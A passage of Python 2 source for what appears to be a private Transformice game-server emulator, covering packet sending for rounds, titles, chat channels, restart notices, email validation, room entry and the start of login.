                                    self.titleList = ['0,7'] + self.GiftTitleList + self.ShamanTitleList + self.HardModeTitleList + self.CheeseTitleList + self.FirstTitleList + self.ShopTitleList + self.BootcampTitleList + self.DivineModeTitleList
                                else:
                                    self.titleList = ['0'] + self.GiftTitleList + self.ShamanTitleList + self.HardModeTitleList + self.CheeseTitleList + self.FirstTitleList + self.ShopTitleList + self.BootcampTitleList + self.DivineModeTitleList
                                if self.privilegeLevel == 10:
                                    self.titleList = self.titleList + ['440',
                                     '442',
                                     '444',
                                     '445',
                                     '447',
                                     '448',
                                     '446']
                                self.titleList = filter(None, self.titleList)
                if self.room.isMulodrome:
                    self.room.sendPointTeam(self.playerCode)
                if self.room.isDefilante:
                    self.sendPlayerGotPoints(self.playerCode, self.defilantePoints, timeTaken)
                else:
                    self.sendPlayerGotCheese(self.playerCode, self.score, numCom, timeTaken)
                self.SkillModule.sendPlayerExperience(exp)
                if self.room.isMiniGame:
                    try:
                        self.room.GameScript.eventPlayerWon(self.username)
                    except:
                        pass

                if int(self.room.getPlayerCount()) >= 1:
                    if self.room.isDoubleMap:
                        if self.room.checkIfDoubleShamansAreDead():
                            self.send20SecRemainingTimer()
                        elif self.room.checkIfShamanIsDead():
                            self.send20SecRemainingTimer()
                    if self.room.checkIfTooFewRemaining():
                        self.send20SecRemainingTimer()
                if self.room.numCompleted >= 1 and self.room.getPlayerCount() >= 2 and self.room.checkIfTooFewRemaining():
                    f = False
                    for client in self.room.clients.values():
                        if client.isShaman and client.opportunist:
                            client.opportunist = False
                            client.playerWin(0, codePartie)
                            f = True
                            break

                    if not f:
                        self.room.checkShouldChangeWorld()
                else:
                    self.room.checkShouldChangeWorld()
        return

    def sendPlayerGotCheese(self, playerCode, score, place, timeTaken):
        if self.hasCheese:
            self.hasEnter = True
        if timeTaken > 32767:
            timeTaken = 32767
        p = self.parseByte.ByteArray()
        p.writeByte(self.getCheeseForTeam(playerCode))
        p.writeInt(playerCode)
        p.writeShort(score)
        p.writeByte(place)
        p.writeShort(timeTaken)
        self.room.sendAllBin('\x08\x06', p.toString())
        self.hasCheese = False

    def sendShamanCode(self, shamanPlayerCode):
        if shamanPlayerCode == 0:
            self.sendShamanLevel(0, 0, 0, 0, 0, 0, 0, 0)
        else:
            hardMode = self.server.getPlayerHardMode(shamanPlayerCode)
            level = self.server.getPlayerLevel(shamanPlayerCode)
            badge = self.server.playerBadgeCode(shamanPlayerCode)
            if str(hardMode) == '1':
                self.room.isShamMode[0] = 1
            elif str(hardMode) == '2':
                self.room.isShamMode[0] = 2
            self.sendShamanLevel(shamanPlayerCode, 0, int(hardMode), 0, level, 0, badge, 0)

    def sendDoubleShamanCode(self, shamanPlayerCode, shamanPlayerCodeTwo):
        hardOne = self.server.getPlayerHardMode(shamanPlayerCode)
        levelOne = self.server.getPlayerLevel(shamanPlayerCode)
        badgeOne = self.server.playerBadgeCode(shamanPlayerCode)
        if str(hardOne) == '1':
            self.room.isShamMode[0] = 1
        elif str(hardOne) == '2':
            self.room.isShamMode[0] = 2
        hardTwo = self.server.getPlayerHardMode(shamanPlayerCodeTwo)
        levelTwo = self.server.getPlayerLevel(shamanPlayerCodeTwo)
        badgeTwo = self.server.playerBadgeCode(shamanPlayerCodeTwo)
        if str(hardTwo) == '1':
            self.room.isShamMode[1] = 1
        elif str(hardTwo) == '2':
            self.room.isShamMode[1] = 2
        self.sendShamanLevel(shamanPlayerCode, shamanPlayerCodeTwo, hardOne, hardTwo, levelOne, levelTwo, badgeOne, badgeTwo)

    def sendSynchroniser(self, playerCode, OnlySelf = None):
        if OnlySelf:
            if self.room.ISCM != -1:
                self.sendData('\x08\x15', [playerCode, ''])
            elif self.room.ISCMV != 0:
                self.sendData('\x08\x15', [playerCode, ''])
            else:
                self.sendData('\x08\x15', [playerCode])
        elif self.room.ISCM != -1:
            self.room.sendAll('\x08\x15', [playerCode, ''])
        elif self.room.ISCMV != 0:
            self.room.sendAll('\x08\x15', [playerCode, ''])
        else:
            self.room.sendAll('\x08\x15', [playerCode])

    def sendNewTitle(self, titlenum):
        self.sendData('\x08\r', [titlenum])

    def sendTime(self, timeLeft):
        p = self.parseByte.ByteArray()
        p.writeShort(timeLeft)
        self.sendData('\x05\x16', p.toString(), True)

    def mapStartTimer(self):
        self.sendData('\x05\n', chr(1), True)
        self.endMapStartTimer = reactor.callLater(3, self.sendEndMapStartTimer)

    def sendEndMapStartTimer(self):
        self.sendData('\x05\n', chr(0), True)

    def sendNoMapStartTimer(self):
        self.sendData('\x05\n', chr(0), True)

    def sendSetAnchors(self, anchors):
        self.sendData('\x05\x07', anchors)

    def sendATEC(self):
        pass

    def sendElection(self):
        pass

    def sendPING(self):
        self.sendData('\x04\x14')

    def sendShamanPerformance(self, shamanName, numGathered):
        self.room.sendAll('\x08\x11', [shamanName, numGathered])

    def sendPlayerAction(self, playerCode, action):
        self.room.sendAll('\x08\x16', [playerCode, action])

    def sendElection(self, playerCode, election):
        self.room.sendAll('\x08\x16', [playerCode, election])

    def sendPlayerEmote(self, data, others = True):
        if others:
            self.room.sendAllOthersBin(self, '\x08\x01', data)
        else:
            self.room.sendAllBin('\x08\x01', data)

    def sendPlayerNewEmote(self, playerCode, emoteCode, others = True):
        p = self.parseByte.ByteArray()
        p.writeInt(playerCode)
        p.writeByte(emoteCode)
        if others:
            self.room.sendAllOthersBin(self, '\x08\x05', p.toString())
        else:
            self.room.sendAllBin('\x08\x05', p.toString())

    def sendElection(self, playerCode, election, others = True):
        p = self.parseByte.ByteArray()
        p.writeInt(election)
        p.writeByte(election)
        if others:
            self.room.sendElection(self, '\x08\x05', p.toString())
        else:
            self.room.sendElection('\x08\x05', p.toString())

    def sendElection(self, election, id1, id2, item = 0):
        p = self.parseByte.ByteArray()
        p.writeInt(election)
        p.writeShort(id1)
        p.writeShort(id2)
        p.writeByte(item)
        self.room.sendElection('\x08,', p.toString())

    def sendAnimZelda(self, playerCode, id1, id2):
        self.room.sendAllBin('\x08,', struct.pack('!lhh', int(playerCode), int(id1), int(id2)))

    def sendNewAnimZelda(self, playerCode, id1, id2, item = 0):
        p = self.parseByte.ByteArray()
        p.writeInt(playerCode)
        p.writeShort(id1)
        p.writeShort(id2)
        p.writeByte(item)
        self.room.sendAllBin('\x08,', p.toString())

    def sendAnimZeldaBadge(self, playerCode, id1, id2, code):
        p = self.parseByte.ByteArray()
        p.writeInt(int(playerCode))
        p.writeByte(int(id1))
        p.writeByte(int(id2))
        p.writeShort(int(code))
        self.room.sendAllBin('\x08*', p.toString())

    def sendAnimZeldaInventario(self, playerCode, id1, id2, code, id3):
        p = self.parseByte.ByteArray()
        p.writeInt(int(playerCode))
        p.writeByte(int(id1))
        p.writeByte(int(id2))
        p.writeShort(int(code))
        p.writeByte(int(id3))
        self.room.sendAllBin('\x08,', p.toString())

    def sendAnimZeldaInventario(self, playerCode, id1, id2, code, id3):
        data = struct.pack("!i", int(playerCode))
        data = struct.pack("!b", int(id1))
        data = struct.pack("!b", int(id2))
        data = struct.pack("!h", int(code))
        data = struct.pack("!b", int(id3))
        self.room.sendAllBin('\x08\x2c' + data, [], True)

    def sendModMessage(self, name, message):
        p = self.parseByte.ByteArray()
        p.writeByte(0)
        p.writeUTF('')
        p.writeUTF(message)
        p.writeShort(0)
        self.room.sendAllBin('\x06\n', p.toString())

    def sendServerMessageName(self, name, message):
        p = self.parseByte.ByteArray()
        p.writeByte(1)
        p.writeUTF(name)
        p.writeUTF(message)
        p.writeShort(0)
        self.server.sendWholeServer('\x06\n', p.toString(), True)

    def sendServerMessage(self, message):
        p = self.parseByte.ByteArray()
        p.writeByte(1)
        p.writeUTF('SERVIDOR')
        p.writeUTF(message)
        p.writeShort(0)
        self.server.sendWholeServer('\x06\n', p.toString(), True)

    def sendArbMessageChannel(self, name, message):
        p = self.parseByte.ByteArray()
        p.writeByte(2)
        p.writeUTF(name)
        p.writeUTF(message)
        p.writeShort(0)
        self.server.sendArbChatLocal(self, '\x06\n', p.toString(), True)

    def sendModMessageChannel(self, name, message):
        p = self.parseByte.ByteArray()
        p.writeByte(3)
        p.writeUTF(name)
        p.writeUTF(message)
        p.writeShort(0)
        self.server.sendModChatLocal(self, '\x06\n', p.toString(), True)

    def sendAllModMessageChannel(self, name, message):
        p = self.parseByte.ByteArray()
        p.writeByte(4)
        p.writeUTF(name)
        p.writeUTF(message)
        p.writeShort(0)
        self.server.sendModChat(self, '\x06\n', p.toString(), True)

    def sendAllArbMessageChannel(self, name, message):
        p = self.parseByte.ByteArray()
        p.writeByte(5)
        p.writeUTF(name)
        p.writeUTF(message)
        p.writeShort(0)
        self.server.sendArbChat(self, '\x06\n', p.toString(), True)

    def sendServerMessageChannel(self, name, message):
        p = self.parseByte.ByteArray()
        p.writeByte(6)
        p.writeUTF(name)
        p.writeUTF(message)
        p.writeShort(0)
        self.server.sendWholeServerLocal(self, '\x06\n', p.toString(), True)

    def sendMapCrewMessageChannel(self, name, message):
        p = self.parseByte.ByteArray()
        p.writeByte(7)
        p.writeUTF(name)
        p.writeUTF(message)
        p.writeShort(0)
        self.server.sendMapCrewChat(self, '\x06\n', p.toString(), True)

    def sendModuleTeamMessageChannel(self, name, message):
        p = self.parseByte.ByteArray()
        p.writeByte(8)
        p.writeUTF(name)
        p.writeUTF(message)
        p.writeShort(0)
        self.server.sendModuleTeamChat(self, '\x06\n', p.toString(), True)

    def sendModMCLogin(self, name):
        self.room.sendModChatOthersLogin(self, '\x06\x14', name)

    def sendArbMCLogin(self, name):
        self.room.sendArbChatOthersLogin(self, '\x06\n', name)

    def sendBotLogin(self, name):
        roomname = ''
        for room in self.server.rooms.values():
            for playerCode, client in room.clients.items():
                if client.username == name:
                    roomname = client.room.name

        for room in self.server.rooms.values():
            for playerCode, client in room.clients.items():
                if client.privilegeLevel >= 3:
                    owner = self.server.getBotOwner(name)
                    client.sendData('\x1a\x06', ['Servidor', '%s (%s) : %s' % (name, owner, roomname)])

    def sendTotem(self, totem, x, y, playercode):
        self.room.sendSync('\x16\x16', [str(playercode) + '#' + str(x) + '#' + str(y) + totem])

    def sendServerRestart(self, phase = None, pfive = None):
        if phase:
            if phase == 1:
                self.sendServerRestartSEC(60)
                self.rebootNoticeTimer = reactor.callLater(30, self.sendServerRestart, 2)
            elif phase == 2:
                self.sendServerRestartSEC(30)
                self.rebootNoticeTimer = reactor.callLater(10, self.sendServerRestart, 3)
            elif phase == 3:
                self.sendServerRestartSEC(20)
                self.rebootNoticeTimer = reactor.callLater(10, self.sendServerRestart, 4)
            elif phase == 4:
                self.sendServerRestartSEC(10)
                self.rebootNoticeTimer = reactor.callLater(1, self.sendServerRestart, 5, 9)
            elif phase == 5:
                if pfive:
                    if pfive > 0:
                        self.sendServerRestartSEC(pfive)
                        self.rebootNoticeTimer = reactor.callLater(1, self.sendServerRestart, 5, pfive - 1)
        else:
            self.sendServerRestartMIN(2)
            self.rebootNoticeTimer = reactor.callLater(60, self.sendServerRestart, 1)

    def sendServerRestartSEC(self, seconds):
        seconds = seconds * 1000
        if seconds >= 60001:
            pass
        else:
            self.room.sendWholeServer(self, '\x1cX', struct.pack('!l', seconds), True)

    def sendServerRestartMIN(self, minutes):
        minutes = minutes * 60000
        if minutes == 60000:
            minutes = 60001
        self.room.sendWholeServer(self, '\x1cX', struct.pack('!l', minutes), True)

    def sendGiftAmount(self, amount):
        self.sendData('\x13\x14', [amount])

    def sendUnlockTitleNatal(self, lib):
        if int(lib) in self.noelGiftTitleCheckList:
            unlockedtitle = self.noelGiftTitleDictionary[int(lib)]
            if not self.checkInTitleList(unlockedtitle):
                self.sendUnlockedTitle(self.playerCode, unlockedtitle)
                self.GiftTitleList = self.GiftTitleList + [unlockedtitle]
                if self.username == 'Kekool':
                    self.titleList = ['0,7'] + self.GiftTitleList + self.ShamanTitleList + self.HardModeTitleList + self.CheeseTitleList + self.FirstTitleList + self.ShopTitleList + self.BootcampTitleList
                else:
                    self.titleList = ['0'] + self.GiftTitleList + self.ShamanTitleList + self.HardModeTitleList + self.CheeseTitleList + self.FirstTitleList + self.ShopTitleList + self.BootcampTitleList
                if self.privilegeLevel == 10:
                    self.titleList = self.titleList + ['440',
                     '442',
                     '444',
                     '445',
                     '446',
                     '447',
                     '448']
                self.titleList = filter(None, self.titleList)
        return

    def sendUnlockItemNatal(self, cate, item, full):
        if not self.checkInShop(str(full)):
            if self.shopitems == '':
                self.shopitems = str(full)
            else:
                self.shopitems = self.shopitems + ',' + str(full)
            self.sendData('\x14\x02', struct.pack('!hb', full, 1), True)
            looklist = self.look.split(',')
            looklist[cate] = str(item)
            self.look = json.dumps(looklist)
            self.look = self.look.strip('[]')
            self.look = self.look.replace('"', '')
            self.look = self.look.replace(' ', '')
            self.sendShopList()
            self.checkUnlockShopTitle()
            self.sendAnimZelda(self.playerCode, cate, item)

    def sendCounterGifts(self, gifts):
        a, b, c = gifts.split('#')
        data = str(a) + ',' + str(0) + ',' + str(b) + ',' + str(0) + ',' + str(c)
        self.sendData('\x1a\x0e', struct.pack('!h', len(data)) + data, True)

    def sendPresent(self, fromPlayerCode, fromPlayerName, toPlayerName):
        self.room.sendAll('\x13\x17', [fromPlayerCode, fromPlayerName, toPlayerName])

    def saveRemainingMiceMessage(self):
        self.sendData('\x08\x12')

    def sendPlayMusic(self, path, OnlySelf = None):
        if OnlySelf:
            self.sendData('\x1a\x0c', [path])
        else:
            self.room.sendAll('\x1a\x0c', [path])

    def sendStopMusic(self):
        self.room.sendAll('\x1a\x0c', [])

    def sendSentPrivMsg(self, username, message):
        nameLength = struct.pack('!h', len(username))
        messageLength = struct.pack('!h', len(message))
        data = '\x00' + nameLength + username + '\x00' + messageLength + message + '\x00'
        self.sendData('\x06\x07', data, True)

    def sendRecievePrivMsg(self, username, message, cmmy):
        nameLength = struct.pack('!h', len(username))
        messageLength = struct.pack('!h', len(message))
        if cmmy == 'es':
            cmm = '\x04'
        else:
            cmm = '\x00'
        data = '\x01' + nameLength + username + cmm + messageLength + message + '\x00'
        self.sendData('\x06\x07', data, True)

    def sendPlayerNotFound(self):
        pass

    def sendHardMode(self, mode):
        p = self.parseByte.ByteArray()
        p.writeByte(int(mode))
        p.writeBoolean(self.ShamDivine)
        self.sendData('\x1c\n', p.toString(), True)

    def sendNewHat(self):
        self.room.sendWholeServer(self, '\x1c\x1c', struct.pack('!h', 0), True)

    def sendTotemItemCount(self, number):
        if self.room.currentWorld == 444:
            self.sendData('\x1c\x0b', struct.pack('!hh', number * 2, 0), True)

    def sendValidationCodeDialog(self):
        email = self.EmailAddress
        if not re.search('@', email) or not re.search('\\.', email):
            return
        t1 = email.split('@')
        t2 = t1[1].split('.')
        address = []
        address.append(t1[0])
        address.append(t2[0])
        address.extend(t2[1:])
        t3 = '.'.join(t2[1:-1])
        sendEmail = address[0][0] + '*' * (len(address[0]) - 1) + '@' + address[1][0] + '*' * (len(address[1]) - 1) + '*' * (len(t3) + 1) + '.' + address[-1]
        packet = self.parseByte.ByteArray()
        packet.writeByte(1)
        packet.writeUTF(sendEmail)
        self.sendData('\x1c\x11', packet.toString(), True)

    def sendEmailValidatedDialog(self):
        self.sendData('\x1c\x0c', chr(1), True)

    def sendEmailRequestedCodeForChange(self):
        self.sendData('\x1c(', chr(1), True)

    def sendRecoveryEmailValidatedDialog(self):
        self.sendData('\x1c(', chr(2), True)

    def sendEmailRequestedCodeForChangeInvalid(self):
        self.sendData('\x1c(', chr(0), True)

    def sendEmailCodeInvalid(self):
        self.sendData('\x1c\x0c', chr(0), True)

    def sendEmailValidated(self):
        self.sendData('\x1c\r', chr(1), True)

    def sendEmailDialog(self):
        self.sendData('\x1c\x0f', '', True)

    def sendEmailSent(self):
        self.sendData('\x1c\x10', chr(1), True)

    def sendEmailAddrAlreadyUsed(self):
        self.sendData('\x1c\x10', chr(0), True)

    def checkEmailAddrrsSelf(self, EmailAddr, username):
        self.Database.execute('SELECT Email FROM users WHERE name = ?', [username])
        rrfRows = self.Database.fetchone()
        if rrfRows[0] is None:
            return False
        elif rrfRows[0] == str(EmailAddr):
            return True
        else:
            return False
            return

    def checkDuplicateEmail(self, address):
        self.Database.execute('select Email from users')
        rrfRows = self.Database.fetchall()
        if rrfRows is None:
            EList = []
        else:
            EList = []
            for rrf in rrfRows:
                if rrf[0] == 'None':
                    pass
                else:
                    EList.append(str(rrf[0]).lower())

        if address.lower() in EList:
            return True
        else:
            return False
            return

    def checkValidEmail(self, address):
        if not re.search('@', address):
            print '3980'
            return False
        elif not re.search('\\.', address):
            print '3983'
            return False
        t1 = address.split('@')
        t2 = t1[1].split('.')
        address = []
        address.append(t1[0])
        address.append(t2[0])
        address.append(t2[1])
        if len(address[2]) > 6:
            print '3992'
            return False
        address[1] = address[1].lower()
        if address[0].lower() in ('admin', 'administrator', 'support', 'nospam', 'spam', 'tech', 'techsupport', 'noreply', 'automatic', 'yahoo', 'microsoft', 'live', 'hotmail', 'google', 'gmail', 'gmx'):
            print '3999'
            return False
        else:
            return True

    def getPlayerData(self, Noshop = False):
        if self.room:
            self.checkMulodromeRun()
            if self.room.isBootcamp or self.room.getPlayerCount() >= 100:
                return '#'.join(map(str, [self.username,
                 self.playerCode,
                 0,
                 int(self.isDead),
                 self.score,
                 int(self.hasCheese),
                 self.titleNumber,
                 self.avatar,
                 '1;0,0,0,0,0,0,0,0,0',
                 self.forumid,
                 '78583a',
                 '95d9d6',
                 0]))
            else:
                return '#'.join(map(str, [self.username,
                 self.playerCode,
                 0,
                 int(self.isDead),
                 self.score,
                 int(self.hasCheese),
                 self.titleNumber,
                 self.avatar,
                 self.look,
                 self.forumid,
                 self.color1,
                 self.color2,
                 0]))
        else:
            return '#'.join(map(str, [self.username,
             self.playerCode,
             0,
             int(self.isDead),
             self.score,
             int(self.hasCheese),
             self.titleNumber,
             self.avatar,
             self.look,
             self.forumid,
             self.color1,
             self.color2,
             0]))

    def enterRoom(self, roomName):
        roomName = roomName.replace('<', '&amp;lt;')
        self.roomname = roomName
        if roomName in ('801', '*801'):
            roomName = '*plazza'
        if roomName.startswith('music'):
            gamemode = 11
            servergame = 0
            self.isVanilla = True
        elif roomName.startswith('madchess'):
            gamemode = 1
            servergame = 4
        else:
            gamemode = 4
            servergame = 0
        if roomName.startswith(self.Langue + '-' + '\x03' + '[Editeur] '):
            editeurnamecheck = roomName.replace('\x03[Editeur] ', '')
            if editeurnamecheck == self.username:
                pass
            if editeurnamecheck != self.username:
                self.transport.loseConnection()
        if roomName.startswith(self.Langue + '-' + '\x03' + '[Totem] '):
            editeurnamecheck = roomName.replace('\x03[Totem] ', '')
            if editeurnamecheck == self.username:
                pass
            if editeurnamecheck != self.username:
                self.transport.loseConnection()
        self.checkMulodrome()
        if roomName.startswith('*'):
            pass
        elif roomName[:3] in COMMUNITY and self.privilegeLevel >= 4:
            pass
        else:
            roomName = self.Langue + '-' + roomName
        self.roomname = roomName
        if roomName in self.server.rooms:
            if self.server.rooms[roomName].getPlayerCount() >= self.server.rooms[roomName].playerLimit:
                if self.privilegeLevel not in (3, 4, 5, 6, 8, 10):
                    if roomName.isdigit:
                        self.enterRoom(self.server.recommendRoom(self.Langue))
                    else:
                        self.enterRoom(self.server.recommendRoomPrefixed(self.Langue, roomName))
                    return
        if self.room:
            if self.AwakeTimerKickTimer:
                try:
                    self.AwakeTimerKickTimer.cancel()
                except:
                    self.AwakeTimerKickTimer = None

            self.room.removeClient(self)
        self.resetPlay()
        self.score = 0
        self.modeGame(servergame, gamemode)
        self.sendEnterRoom(roomName)
        self.LoadCountTotem = False
        if DEBUGM:
            print str(datetime.today()) + ' ' + 'Entrada Na Sala: %s - %s' % (roomName, self.username)
        self.server.addClientToRoom(self, roomName)
        if self.privilegeLevel > 0:
            for i, v in enumerate(self.friendsList):
                self.Tribulle.sendFriendChangedRoom(v, self.username)

            if self.isInTribe:
                self.Tribulle.sendMemberTribeChangeRoom()
        return

    def AwakeTimerKick(self):
        if DEBUGM:
            print 'AwakeTimer kicked ' + self.address[0] + '!'
        if self.room:
            self.updateSelfSQL()
            self.sendPlayerDied(self.playerCode, self.score)
            self.room.removeClient(self)
        self.transport.loseConnection()

    def sendAnuncio(self):
        self.sendMessage("<J>[CreandoMice] Diviertace en nuestro mice! .</fonte></b>")

    def checkMulodrome(self):
        if self.room:
            if self.room.LeaderDrome:
                try:
                    del self.room.TeamDrome[self.username]
                except:
                    pass

                self.sendData('\x1e\r', None, True)
        return

    def initTotemEditor(self):
        if self.RTotem:
            self.sendTotemItemCount(0)
            self.RTotem = False
        elif self.STotem[1] != '':
            self.Totem = [0, '']
            self.sendTotemItemCount(self.STotem[0])
            self.sendTotem(self.STotem[1], 400, 203, self.playerCode)
        else:
            self.sendTotemItemCount(0)

    def modeGame(self, servergame, gamemode):
        self.sendData(',\x16', chr(self.currentPacketPos), True)
        self.sendServerGameType(servergame)
        self.sendData('\x07\x1e', chr(gamemode), True)

    def resetPlay(self):
        self.isShaman = False
        self.hasCheese = False
        self.isSyncroniser = False
        self.isFishing = False
        self.isZombie = False
        self.canMeep = False
        self.UTotem = False
        self.JumpCheck = 1
        self.defilantePoints = 0
        self.isDead = False
        self.canCollect = False
        self.isIceCount = 0
        self.isAmbulance = 0
        self.hasEnter = False
        self.isTransformation = False
        self.personalTp = False
        self.respawn = False
        self.opportunist = False
        self.pX = 0
        self.pY = 0
        self.movingRight = False
        self.movingLeft = False
        self.Vx = 0
        self.Vy = 0
        self.isJumping = False

    def checkMulodromeRun(self):
        if self.room.isMulodrome:
            try:
                return self.room.TeamDrome[self.username]
            except:
                self.isDead = True
                self.SPEC = True

    def getBadgeRank(self, ranking):
        lista = {'S': {'0': 'k4ZjliB.png',
               '1': 'WwcBnTF.png',
               '2': 'wSm9qWG.png'},
         'C': {'0': 'gwUHfRf.png',
               '1': 'Lode8w9.png',
               '2': 'hDxuZOO.png'},
         'F': {'0': 'vt3TUem.png',
               '1': 'qECN7zx.png',
               '2': 'nNP0YOl.png'}}
        points = []
        code = 0
        pos = 0
        for x, c in ranking.items():
            points.append(c)

        for x, c in ranking.items():
            if c == min(points):
                pos = str(c)
                code = x

        if 'S' in ranking and 'C' in ranking and 'F' in ranking:
            if ranking['S'] is 0 and ranking['C'] is 0 and ranking['F'] is 0:
                return 'VOxStix.png'
        return lista[code][pos]

    def getPlayerRanked(self):
        for playerName, ranking in self.server.RankList['users'].items():
            for playerCode, client in self.room.clients.items():
                if playerName == client.username:
                    p = self.parseByte.ByteArray()
                    playerCode = self.room.getPlayerCode(playerName, True)
                    if playerCode == 0:
                        continue
                    p.writeInt(playerCode)
                    p.writeUTF(self.getBadgeRank(ranking))
                    p.writeByte(2)
                    p.writeInt(playerCode)
                    p.writeShort(len(playerName) + 35)
                    p.writeShort(-85)
                    self.sendData('\x1d\x13', p.toString(), True)

    def startPlay(self, ISCM, SPEC):
        if self.room.getPlayerCount() >= 2 and self.room.countStats:
            self.roundCount = self.roundCount + 1
        self.resetPlay()
        if self.server.isChristmas:
            self.sendCounterGifts(self.giftCount)
        if SPEC == 1:
            self.isDead = True
            self.SPEC = True
        else:
            self.SPEC = False
            self.isDead = False
        self.hasCheese = False
        self.sendNoMapStartTimer()
        if ISCM != -1:
            self.sendNewPartyCustomMap(self.room.ISCM, self.room.ISCMdata[2], self.room.ISCMdata[1], self.room.ISCMdata[5])
        elif self.room.ISCM != -1:
            self.sendNewPartyCustomMap(self.room.ISCM, self.room.ISCMdata[2], self.room.ISCMdata[1], self.room.ISCMdata[5])
        elif self.room.ISCMV != 0 and self.room.isEditeur:
            self.sendNewPartyMapEditeur(self.room.ISCMVdata[2], self.room.ISCMVdata[1], self.room.ISCMVdata[5])
        else:
            self.sendNewParty()
        if self.room.isDoubleMap:
            shamans = self.room.getDoubleShamanCode()
            shamanCode = shamans[0]
            shamanCode2 = shamans[1]
            if self.room.noShaman:
                shamanCode = 0
                shamanCode2 = 0
            self.SkillModule.getShamanSkills(shamanCode)
            self.SkillModule.getShamanSkills(shamanCode2)
            if self.playerCode == shamanCode or self.playerCode == shamanCode2:
                self.isShaman = True
                self.SkillModule.getSkillsPower()
        else:
            shamanCode = self.room.getShamanCode()
            if self.room.currentWorld not in (108, 109):
                self.SkillModule.getShamanSkills(shamanCode)
                if self.playerCode == shamanCode:
                    self.isShaman = True
                    if not self.room.isSurvivor:
                        self.SkillModule.getSkillsPower()
        self.sendPlayerList()
        self.getPlayerRanked()
        if self.room.currentWorld in (108, 109):
            self.catchTheCheeseNoShaman(shamanCode)
        elif self.room.currentWorld in (110, 111, 112, 113, 114):
            self.catchTheCheeseShaman(shamanCode)
        elif self.room.isDoubleMap:
            self.sendDoubleShamanCode(shamanCode, shamanCode2)
        else:
            self.sendShamanCode(shamanCode)
        if self.room.sSync:
            syncroniserCode = self.room.getSyncroniserCode()
            self.sendSynchroniser(syncroniserCode, True)
            if syncroniserCode == self.playerCode:
                self.isSyncroniser = True
        if self.room.eSync:
            syncroniserCode = self.room.getSyncroniserCode()
            self.sendSynchroniser(self.playerCode, True)
        if self.room.isMulodrome:
            self.sendTeamColors()
        if self.room.currentWorld == 888:
            self.sendTime(60)
        elif self.room.ISCMdata[5] == 11:
            if self.room.getPlayerCount(False) >= 2 and self.room.countStats:
                self.room.ZombieTimer = reactor.callLater(16.5, self.room.goZombified)
        elif self.room.ISCM in (5,):
            self.room.isEventMap = True
        else:
            self.sendTime(self.room.roundTime + self.room.AddTime + int(self.room.gameStartTime - self.getTimer()))
            if self.room.ZombieTimer:
                try:
                    self.room.ZombieTimer.cancel()
                except:
                    self.room.ZombieTimer = None

        if self.room.PRShamanIsShaman:
            self.room.forceNextShaman = self.room.getPlayerCode(self.room.name.replace('\x03[Private] ', ''))
        if self.room.currentWorld in range(200, 211):
            self.room.never20secTimer = True
            self.sendData('\x1b\n', '', True)
        if self.room.isSurvivor:
            if self.isShaman:
                self.canMeep = True
                self.sendData("\x08'", None, True)
        if self.room.autoRespawn or self.room.isTribehouseMap:
            self.playerStartTime = self.getTimer()
        if self.room.isTotemEditeur:
            self.initTotemEditor()
        if self.room.currentWorld == 560:
            day = datetime.today()
            self.room.sendCalendar(str(day)[8:-16])
        if self.room.isChristmasMap:
            if self.room.ISCM in (561,):
                self.sendData('\x15\x15', [0,
                 'Papaille',
                 '4;21,0,0,0,3,0,2,0,0',
                 550,
                 370,
                 '0',
                 '0'])
            elif self.room.ISCM in (562,):
                self.sendData('\x1d\x13', '\x00\x00\x00\x00\x00\x0bbEljArL.png\x04\x00\x00\x00\x01\x00\x00\x00\x00\x00', True)
        if self.room.isCurrentlyPlayingRoom:
            self.sendNoMapStartTimer()
        elif self.room.isEditeur:
            self.sendNoMapStartTimer()
        elif self.room.isBootcamp:
            self.sendNoMapStartTimer()
        elif self.room.isPlazza:
            self.sendNoMapStartTimer()
        elif self.room.name.startswith(self.Langue + '-' + '\x03[Totem] '):
            self.sendNoMapStartTimer()
        elif self.room.name.startswith(self.Langue + '-' + '\x03[Tutorial] '):
            self.sendNoMapStartTimer()
        else:
            self.mapStartTimer()
        if self.isHidden:
            self.isHidden = True
            self.sendPlayerDisconnect(self.playerCode)
        return

    def sendTesteRef(self):
        if DEBUGM:
            print 'referencias a ' + self.username + ': ' + str(sys.getrefcount(self) - 1)

    def startValidate(self, mapxml):
        self.room.isValidate = 1
        self.resetPlay()
        self.room.ISCM = -1
        mapname = '-'
        perma = '0'
        self.sendNewPartyMapEditeur(mapxml, mapname, perma)
        self.sendTime(120)
        self.sendPlayerList()
        shamanCode = self.room.getShamanCode()
        self.sendShamanCode(shamanCode)
        if shamanCode == self.playerCode:
            self.isShaman = True
        syncroniserCode = self.room.getSyncroniserCode()
        self.sendSynchroniser(syncroniserCode, True)
        if syncroniserCode == self.playerCode:
            self.isSyncroniser = True

    def sendAvisodeEvento(self):
        self.chatMessage("<ROSE>El evento comenzara en 30 seguntos")
 
    def sendAvisodeEvento2(self):
        self.chatMessage("<ROSE>El evento comenzara en 10 segundos")
 
    def sendAvisodeEvento3(self):
        self.chatMessage("<ROSE>El evento comenzo")

    def sendEventDay(self):
        self.shopcoins += 50
        self.shopfraises += 50
        self.shopcheese += 50
        self.firstcount += 50
        self.cheesecount += 50
        self.chatMessage("Has recibido 50 monedas, 50 shop fresas, 50 shop quesos, 50 first y 50 quesos en su cuenta")

    def updateSelfSQL(self):
        if self.privilegeLevel == 0:
            pass
        else:
            self.server.updatePlayerStats(self.username, self.roundCount, self.micesaves, self.shamancheese, self.firstcount, self.cheesecount, self.shopcheese, self.shopitems, self.look, self.ShamanTitleList, self.CheeseTitleList, self.FirstTitleList, self.titleList, self.hardMode, self.hardModeSaves, self.HardModeTitleList, self.ShopTitleList, self.bootcampcount, self.BootcampTitleList, self.shopfraises, self.shopcoins, self.visuals, self.playerLevel, self.playerExp, self.playerExpNext, self.giftCount, self.divineModeSaves, self.DivineModeTitleList, self.Badges, self.survivorStats)

    def updateLanguageUsuario(self, data):
        self.numlanguage = data
        flag = self.server.Communities[ord(data[:1])]
        if flag == '':
            flag = 'en'
        self.LangueByte = data[:1]
        self.LangueId = ord(data[:1])
        self.Langue = flag
        if Setting.Debug:
            print 'Idioma do Jogador Atualizado (' + flag + ') (%i)' % ord(data[:1])

    def login(self, username, passwordHash, startRoom):
        if username == '':
            username = 'Souris'
        if startRoom == '1':
            startRoom = '1'
        if self.server.getIPPermaBan(self.address[0]):
            self.transport.loseConnection()
            self.isIPban = True
        elif self.address[0] in self.server.tempIPBanList:
            self.transport.loseConnection()
            self.isIPban = True
        else:
            self.isIPban = False
        if passwordHash == '':
            if len(username) > 15:
                priv = -1
                self.transport.loseConnection()
            else:
                username = '*' + username
                priv = 0
                username = self.server.checkAlreadyExistingGuest(username)
